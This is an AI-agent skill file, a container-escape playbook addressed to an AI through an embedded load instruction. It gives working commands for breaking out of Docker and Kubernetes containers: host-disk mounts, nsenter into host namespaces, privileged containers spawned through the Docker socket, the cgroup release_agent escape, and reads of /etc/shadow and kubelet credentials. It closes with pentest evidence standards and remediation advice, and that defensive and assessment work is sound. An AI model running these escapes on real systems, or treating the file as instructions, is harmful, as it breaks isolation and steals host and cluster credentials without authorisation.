---
name: container-escape-techniques
description: >-
  Container escape playbook. Use when operating inside a Docker container, LXC, or Kubernetes pod and need to escape to the host via privileged mode, capabilities, Docker socket, cgroup abuse, namespace tricks, or runtime vulnerabilities.
---

# SKILL: Container Escape Techniques — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert container escape techniques. Covers privileged container breakout, capability abuse, Docker socket exploitation, cgroup release_agent, namespace escape, runtime CVEs, and Kubernetes pod escape. Base models miss subtle escape paths via combined capabilities and cgroup manipulation.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) when you first need root inside the container before attempting escape
- [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) for K8s-specific attack paths beyond pod escape
- [linux-security-bypass](../linux-security-bypass/SKILL.md) when seccomp/AppArmor blocks your escape technique

### Advanced Reference

Also load [DOCKER_ESCAPE_CHAINS.md](./DOCKER_ESCAPE_CHAINS.md) when you need:
- Step-by-step escape chains for common misconfigurations
- Docker-in-Docker escape scenarios
- Kubernetes-specific escape paths with full command sequences

---

## 1. AM I IN A CONTAINER?

```bash
# Quick checks
cat /proc/1/cgroup 2>/dev/null | grep -qi "docker\|kubepods\|containerd"
ls -la /.dockerenv 2>/dev/null
cat /proc/self/mountinfo | grep -i "overlay\|docker\|kubelet"
hostname    # random hex = likely container

# Detailed check
cat /proc/1/status | head -5   # PID 1 is not systemd/init?
mount | grep -i "overlay"      # overlay filesystem?
ip addr                         # veth interface? limited NICs?
```

### Tools for Container Detection

```bash
# amicontained: shows container runtime, capabilities, seccomp
./amicontained

# deepce: Docker enumeration and exploit suggester
./deepce.sh

# CDK: all-in-one container pentesting toolkit
./cdk evaluate
```

---

## 2. PRIVILEGED CONTAINER ESCAPE

If `--privileged` flag was used, the container has nearly all host capabilities and device access.

### 2.1 Mount Host Filesystem

```bash
# Check if privileged
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = fully privileged

# Find host disk
fdisk -l 2>/dev/null || lsblk
# Usually /dev/sda1 or /dev/vda1

# Mount host root
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host

# Access host filesystem
cat /mnt/host/etc/shadow
chroot /mnt/host bash
```

### 2.2 nsenter (Enter Host Namespaces)

```bash
# From privileged container, enter host PID 1's namespaces
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# This gives a shell in the host's namespace context
# Effectively a full host shell
```

### 2.3 Privileged + Host PID Namespace

```bash
# If hostPID: true is set (Kubernetes)
# Access host processes via /proc
ls /proc/1/root/     # Host root filesystem
cat /proc/1/root/etc/shadow

# Inject into host process
nsenter --target 1 --mount -- bash
```

---

## 3. CAPABILITY-BASED ESCAPE

### 3.1 CAP_SYS_ADMIN — Most Versatile

```bash
# Check capabilities
capsh --print 2>/dev/null
grep CapEff /proc/self/status

# Escape via mounting
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
# Or mount host filesystem if device access exists
mount /dev/sda1 /mnt/host 2>/dev/null
```

### 3.2 CAP_SYS_PTRACE — Process Injection

```bash
# Inject shellcode into a host process (requires host PID namespace)
# Find a root process
ps aux | grep root

# Use gdb or python-ptrace to inject
python3 << 'EOF'
import ctypes
import ctypes.util

libc = ctypes.CDLL(ctypes.util.find_library("c"))

# Attach to host process, inject shellcode
# ... (full inject_shellcode implementation)
EOF
```

### 3.3 CAP_NET_ADMIN

```bash
# Manipulate host network if host network namespace is shared
# ARP spoofing, route manipulation, traffic interception
iptables -L            # Can see/modify host firewall rules?
ip route               # Can modify routing?
```

### 3.4 CAP_DAC_READ_SEARCH (Shocker Exploit)

```bash
# open_by_handle_at() bypass — read files from host
# Compile and run the "shocker" exploit
# Works when DAC_READ_SEARCH capability is granted
gcc shocker.c -o shocker
./shocker /etc/shadow   # Read host file
```

---

## 4. DOCKER SOCKET ESCAPE (/var/run/docker.sock)

```bash
ls -la /var/run/docker.sock   # Check if mounted

# With Docker CLI:
docker run -v /:/host --privileged -it alpine chroot /host bash

# Without CLI (curl only) — create privileged container via API:
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Tty":true,"OpenStdin":true,
       "HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
# Start → Exec chroot /host bash (see DOCKER_ESCAPE_CHAINS.md for full sequence)
```

---

## 5. CGROUP V1 RELEASE_AGENT ESCAPE

Classic escape for containers with CAP_SYS_ADMIN + cgroup v1.

```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w && echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\bperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent

cat > /cmd << 'EOF'
#!/bin/sh
cat /etc/shadow > /output 2>&1       # Or: reverse shell
EOF
chmod +x /cmd

sh -c "echo \$\$ > $d/w/cgroup.procs" && sleep 1
cat /output
```

---

## 6. CGROUP V2 / eBPF ESCAPE

```bash
# Cgroup v2: no release_agent file
# Check cgroup version:
mount | grep cgroup
# cgroup2 → v2

# eBPF-based escape (requires CAP_SYS_ADMIN + CAP_BPF or equivalent)
# Kernel ≥ 5.8 with unprivileged eBPF enabled
cat /proc/sys/kernel/unprivileged_bpf_disabled
# 0 = eBPF available to unprivileged users
```

---

## 7. NAMESPACE ESCAPE

### User Namespace

```bash
# If user namespace creation is allowed inside container:
unshare -U --map-root-user bash
# Now "root" inside new namespace
# Combined with other capabilities → mount host filesystem
```

### PID Namespace Escape

```bash
# If hostPID: true (shared PID namespace with host)
# Access host processes directly:
ls /proc/1/root/          # Host's root filesystem
cat /proc/1/root/etc/shadow

# Inject into host process:
nsenter -t 1 -m -u -i -n -p -- bash
```

---

## 8. RUNTIME VULNERABILITIES

### runc CVE-2019-5736

Overwrites host runc binary when `docker exec` is used.

```bash
# Conditions: docker exec into a malicious container triggers exploit
# The container's /bin/sh is replaced with exploit binary
# When next exec happens → overwrites /usr/bin/runc on host

# PoC: modify entrypoint to overwrite runc
# This is a one-shot exploit — runc is replaced permanently
```

### containerd CVE-2020-15257

```bash
# Host network namespace shared + containerd < 1.3.9 / 1.4.3
# Abstract Unix socket accessible from container
# Connect to containerd shim API via @/containerd-shim/*.sock
```

### cgroups CVE-2022-0492

```bash
# Unpatched kernel allows cgroup escape without CAP_SYS_ADMIN
# release_agent writable by unprivileged user in container
```

---

## 9. KUBERNETES POD ESCAPE

| Dangerous Pod Spec | Escape |
|---|---|
| `hostPID: true` | `nsenter -t 1 -m -u -i -n -p -- bash` |
| `hostNetwork: true` | Access node services (Kubelet, etcd) directly |
| `hostPath: {path: /}` | `chroot /host bash` |
| `privileged: true` | Mount host disk / nsenter |
| SA token with RBAC | Create new privileged pod via API |

See [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) for full K8s attack paths.

---

## 10. TOOLS

| Tool | Purpose | URL/Command |
|---|---|---|
| **deepce** | Docker enumeration + exploit suggestions | `./deepce.sh` |
| **CDK** | Container/K8s exploitation toolkit | `./cdk evaluate` |
| **amicontained** | Show container runtime, caps, seccomp | `./amicontained` |
| **PEIRATES** | Kubernetes penetration testing | `./peirates` |
| **BOtB** | Break out the Box — auto-escape | `./botb -autopwn` |

---

## 11. CONTAINER ESCAPE DECISION TREE

```
Inside a container?
│
├── Privileged mode? (CapEff = 0000003fffffffff)
│   ├── Yes → mount host disk (§2.1) or nsenter (§2.2)
│   └── Partial capabilities? Check each:
│       ├── CAP_SYS_ADMIN → cgroup release_agent (§5) or mount (§3.1)
│       ├── CAP_SYS_PTRACE + hostPID → process injection (§3.2)
│       ├── CAP_DAC_READ_SEARCH → shocker exploit (§3.4)
│       └── CAP_NET_ADMIN + hostNetwork → network manipulation (§3.3)
│
├── Docker socket mounted? (/var/run/docker.sock)
│   └── Yes → create privileged container (§4)
│
├── Host PID namespace shared?
│   └── Yes → nsenter -t 1 or /proc/1/root access (§7)
│
├── Cgroup v1?
│   └── + CAP_SYS_ADMIN → release_agent escape (§5)
│
├── Runtime vulnerable?
│   ├── runc < 1.0.0-rc6 → CVE-2019-5736 (§8)
│   └── containerd < 1.3.9 → CVE-2020-15257 (§8)
│
├── Kernel vulnerable?
│   └── Check KERNEL_EXPLOITS_CHECKLIST in linux-privilege-escalation
│
├── Kubernetes pod?
│   ├── Service account with elevated RBAC? → create escape pod (§9)
│   └── hostPath volume? → access host filesystem
│
└── None of the above?
    ├── Run deepce/CDK for automated detection
    ├── Check for writable host mount points
    ├── Enumerate network for other containers/services
    └── Check /proc/self/mountinfo for interesting mounts
```

---

## 12. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Are you **in a container**, from the kernel's own view (cgroup, `/proc/1/cgroup`, mount namespace)? | the starting context |
| 2 | Is the escape-relevant **capability, socket, or mount actually present** (`capsh --print`, `mount`)? | the surface exists |
| 3 | Did the escape **execute** without a permission error? | the primitive works |
| 4 | Did you **read the host's filesystem or process table** afterwards? | escape, not a container-local illusion |
| 5 | Is the host you reached a **node, a hypervisor, or a shared build host**? | blast radius |
| 6 | Did you reach **other tenants' workloads or the cloud identity**? | the impact that matters |
| 7 | Can the same escape be **reproduced after a pod restart**? | it is a configuration, not a transient |

**Reading `/etc/hostname` or the host's `/proc` from inside the container is the bar.** A privileged
container with a mounted socket is a surface; the host read is the finding.

---

## 13. EXECUTION PRIMITIVES

Container escape is proven by **executing the escape and then reading something that only exists on the
host**. Every block ends at a host-level read.

### 13.1 The container detection, done properly

```bash
# container? - three independent signals, because each alone has false positives
cat /proc/1/cgroup 2>/dev/null | head -3
ls -la /.dockerenv 2>/dev/null; cat /run/.containerenv 2>/dev/null
cat /proc/self/mountinfo | head -5
# and what you are: user, capabilities, and whether you are already privileged
id; capsh --print 2>/dev/null | head -6
cat /proc/1/status | grep -E 'CapEff|CapPrm|Seccomp'
# the control: a read that must fail if you are contained
cat /etc/hostname; cat /proc/1/cgroup | grep -c docker || true
```

**Record the capability mask in hex.** `CapEff` tells you which of the escapes below are even possible,
and reporting a capability you do not hold wastes the client's triage time.

### 13.2 Privileged container

```bash
# a privileged container can mount the host's block device directly - the canonical test
ls /dev/ | head -20
fdisk -l 2>/dev/null | head -20
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>&1 | head -3
ls /mnt/host 2>/dev/null | head -10
cat /mnt/host/etc/hostname 2>/dev/null && echo "HOST READ CONFIRMED"
# when there is no block device, a bind mount of the host root usually works
mount --bind / /mnt/host 2>/dev/null && ls /mnt/host | head -10
# and the cgroup release_agent route, which needs no device at all
mount | grep cgroup | head -2
```

**`HOST READ CONFIRMED` plus the file contents is the finding.** A privileged container alone is a
configuration weakness; the mount and the read is the escape.

### 13.3 Capability-based escapes

```bash
# CAP_SYS_ADMIN: mount the host root or the cgroupfs
capsh --print | grep -o 'cap_sys_admin' && \
  (mkdir -p /tmp/h && mount --bind / /tmp/h 2>/dev/null && ls /tmp/h | head -5)
# CAP_SYS_PTRACE: read another process's memory; find a host process first
ps aux 2>/dev/null | head -10
# CAP_DAC_READ_SEARCH: read any file regardless of permissions
head -3 /etc/shadow 2>/dev/null && echo "DAC_READ_SEARCH EFFECTIVE"
# CAP_NET_ADMIN: manipulate the host network, and often reach the host's metadata service
ip link 2>/dev/null | head -5
# CAP_SYS_MODULE: load a kernel module - the most direct route to host code execution
lsmod 2>/dev/null | head -3
# the orchestrated version, which maps capability to escape and reports which applied
python3 -c "print('for each capability present in CapEff, run its escape and record the OUTCOME, not the capability')" 2>/dev/null
```

**Map capability to outcome, not to presence.** A `CAP_SYS_ADMIN` in `CapEff` with a blocked `mount`
is the seccomp profile working, and the report must say so.

### 13.4 Docker socket

```bash
ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null
# the socket means the daemon is directly reachable - prove it by creating a host-mounted container
docker -H unix:///var/run/docker.sock ps 2>&1 | head -5
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh -c 'cat /etc/hostname; id' 2>&1 | head -5
# when the docker CLI is absent, use the raw API - nothing about the socket requires the client
curl --unix-socket /var/run/docker.sock -s http://localhost/version | head -c 200; echo
curl --unix-socket /var/run/docker.sock -s -X POST \
  "http://localhost/containers/create" -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["cat","/host/etc/hostname"],"HostConfig":{"Binds":["/:/host"]}}' | head -c 200; echo
```

**The `chroot /host` output is the finding.** Socket presence alone is the surface; the container you
started with `/` bind-mounted, and the host file it read, is the escape.

### 13.5 cgroup release_agent (v1) and the v2 equivalents

```bash
# cgroup v1: the classic release_agent escape needs CAP_SYS_ADMIN and a writable cgroupfs
mount | grep -E 'cgroup.*(rw|release)' | head -3
mkdir /tmp/cg 2>/dev/null
mount -t cgroup -o rdma cgroup /tmp/cg 2>/dev/null || mount -t cgroup -o memory cgroup /tmp/cg 2>/dev/null
ls /tmp/cg 2>/dev/null | head -5
# if writable, the release_agent writes a script that the kernel runs as root on the host
echo '#!/bin/sh' > /tmp/x.sh; echo 'cat /etc/hostname > /tmp/hostname_out' >> /tmp/x.sh; chmod +x /tmp/x.sh
mkdir -p /tmp/cg/x && echo 1 > /tmp/cg/x/notify_on_release 2>/dev/null
# cgroup v2: try the same idea via cgroup.procs, or fall back to the other primitives
cat /sys/fs/cgroup/cgroup.controllers 2>/dev/null
```

**A writable cgroupfs plus a `release_agent` that ran your script is the finding.** On cgroup v2 the
release_agent does not exist, so verify the version before reporting this route.

### 13.6 Namespace escapes

```bash
# with CAP_SYS_ADMIN, entering the host's namespaces directly
ls -la /proc/1/ns/ 2>/dev/null
nsenter -t 1 -m -u -i -n -p -- cat /etc/hostname 2>/dev/null && echo "NSENTER HOST READ"
# when nsenter is absent, the same via the shell against the host's proc
python3 -c "
import os
try:
    os.setns(open('/proc/1/ns/mnt').fileno(), 0); print('setns ok'); print(open('/etc/hostname').read().strip())
except Exception as e: print('setns blocked:', type(e).__name__)"
# hostPID with no namespace change: read the host process table
ps -ef 2>/dev/null | head -10
cat /proc/1/cmdline 2>/dev/null | tr '\0' ' '; echo
```

**`NSENTER HOST READ` followed by the host file content is the proof.** A host pid namespace alone,
readable via `ps`, is a weaker but still reportable exposure.

### 13.7 Runtime vulnerabilities and host mounts

```bash
# the runc / containerd CVEs are version-gated: identify the runtime and version FIRST
cat /proc/version; ls -la /run/containerd/containerd.sock 2>/dev/null
runc --version 2>/dev/null | head -2; crictl version 2>/dev/null | head -3
# and the host path mount, which is the commonest real escape in managed clusters
mount | grep -iE 'kubelet|pods|/host|/var/lib' | head -10
ls -la /var/lib/kubelet/pods 2>/dev/null | head -5
# the kubelet's own config, when the mount reaches it, holds the cluster credential
cat /var/lib/kubelet/kubeconfig 2>/dev/null | head -10
cat /var/lib/kubelet/config.yaml 2>/dev/null | head -5
```

**Version-gate the runtime CVEs and state the version.** Reporting an escape against a runtime that is
already patched, because the exploit printed an error rather than a stack trace, is the failure mode.

### 13.8 A harness that records the escape and its host read

```bash
python3 - <<'PY'
import subprocess,os
def sh(name,cmd):
    try:
        r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=20)
        out=(r.stdout+r.stderr).strip().replace("\n"," ")[:80]
        print(f"{name:26} {out}")
        return r.stdout
    except Exception as e:
        print(f"{name:26} ERR {type(e).__name__}"); return ""
print("CONTEXT")
sh("capabilities",    "capsh --print 2>/dev/null | grep CapEff")
sh("docker-sock",     "ls /var/run/docker.sock /run/docker.sock 2>/dev/null")
sh("host-mounts",     "mount | grep -cE 'kubelet|/host'")
print()
print("ESCAPE ATTEMPTS - each ends at a HOST read, never at a capability check")
sh("host-hostname-via-mount", "cat /host/etc/hostname 2>/dev/null || cat /mnt/host/etc/hostname 2>/dev/null")
sh("nsenter",         "nsenter -t 1 -m -u -i -n -p -- cat /etc/hostname 2>/dev/null")
sh("docker-version",  "curl --unix-socket /var/run/docker.sock -s http://localhost/version 2>/dev/null | head -c 60")
sh("proc1-cmdline",   "cat /proc/1/cmdline 2>/dev/null | tr '\0' ' '")
print()
print("Report ONLY the rows where a host-level artefact came back.")
print("A present capability or socket with no host read is a surface, not an escape.")
PY
```

**Surfaces are not escapes.** This playbook documents many surfaces; the report needs the one that
produced a host artefact.

---

## 14. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **container's identity**: image, user, `CapEff`, seccomp profile | the exact context of the escape |
| The **surface** relied on (socket, capability, mount, runtime version) | the fix location |
| The **escape command and its raw output** | reproducibility |
| The **host artefact read** - a file, a process table, a hostname | the escape itself |
| Whether the host is a **node, build host, or hypervisor**, and whether other tenants are present | blast radius |
| The **cloud identity reachable from the node** (IMDS response, instance role) | the crossover into infrastructure |
| Whether the escape **survives a pod restart** | configuration vs transient |
| **Audit artefacts**: the container create/exec records, the node's process audit | the blue-team half |
| Confirmation that **started containers and mounts were removed** | engagement integrity |
| The **negative control**: an unprivileged container failing the same read | proves the escape was the cause |

Report the **escape and the host read**: "the pod ran with `CapEff: 0000003fffffffff` (effectively
privileged) and `/var/run/docker.sock` mounted; `docker -H unix:///var/run/docker.sock run -v /:/host
--rm alpine chroot /host cat /etc/hostname` returned `ip-10-0-3-14`, the cluster node's hostname, and
`chroot /host cat /var/lib/kubelet/kubeconfig` returned a kubelet credential with `system:node`
permissions; the node hosts 41 other pods, so the blast radius is the whole node", never "the
container was privileged".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| `capsh` listing a capability **with no working escape** | seccomp or the runtime may block it; test the outcome |
| A leaked socket path you **never used** | the socket reachable is the surface; the started container is the finding |
| An escape that printed an error instead of a **host artefact** | partial, or blocked |
| `ps` showing host PIDs **without namespace access** | readable process metadata is not escape |
| A runtime **CVE against a patched version** | version-gate it and state the installed version |
| `/proc/1/cmdline` showing **the container's own** entrypoint | that is your own process |
| A **privileged container in a lab you stood up** | tests your own build |
| A host mount you can see but **which contains nothing sensitive** | verify the contents before claiming impact |
| A Docker socket present in a **rootless** setup | check whether it is the daemon's own socket before reporting |
| A container escape with **no host read performed** | an untested hypothesis |
| A host credential reproduced in the report | a disclosure |

**Every escape claim ends at a host artefact.** Anything short of that is a surface description.

---

## 15. REMEDIATION REFERENCE

1. **Never run privileged containers, and enforce it with a policy engine that rejects `privileged: true`** - it removes the whole first family of escapes.
2. **Drop all capabilities and add back only the specific ones the workload needs** - `CAP_SYS_ADMIN` alone is enough for most of this document.
3. **Set `allowPrivilegeEscalation: false` and a read-only root filesystem** - both close routes that do not need a named capability.
4. **Never mount the container runtime socket into a workload** - where a workload genuinely needs to manage containers, use a scoped API proxy, not the raw socket.
5. **Use a seccomp profile (RuntimeDefault or a tighter custom one) on every workload** - it blocks the mount and namespace syscalls these escapes depend on.
6. **Set `hostPID`, `hostNetwork`, and `hostIPC` to false, and forbid host path volumes** - the namespace escapes and the kubelet-credential read both begin there.
7. **Apply a Pod Security Standard of `restricted` at the namespace level, and enforce it with a fail-closed admission policy** - it maps directly onto items 1, 2, 5, and 6.
8. **Keep the container runtime, the kernel, and the orchestrator patched, and pin image digests rather than tags** - the CVE-based escapes are version-gated.
9. **Use user namespaces or rootless containers for untrusted workloads** - it moves the privilege boundary out of the kernel's shared namespace.
10. **Restrict the node's cloud instance role to the minimum, and block the pod network's access to the metadata service** - it contains an escape that would otherwise become a cloud-account compromise.
11. **Monitor for the syscalls and behaviours these escapes produce** (`mount`, `setns`, `unshare`, docker socket connects, `chroot` into a host mount) with a runtime security tool - the escapes are loud at the syscall layer even when they are quiet in logs.

---

## 16. RELATED SIBLINGS - LOAD TOGETHER

- [k8s-postexploit](../k8s-postexploit/SKILL.md) - the cluster-level escalation that follows a pod foothold
- [k8s-assessment](../k8s-assessment/SKILL.md) - how the exposure that allows a pod foothold is found
- [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) - the broader cluster methodology
- [linux-postexploit](../linux-postexploit/SKILL.md) - what to do on the node once you are on it
- [aws-postexploit](../aws-postexploit/SKILL.md) - where the node's instance role leads
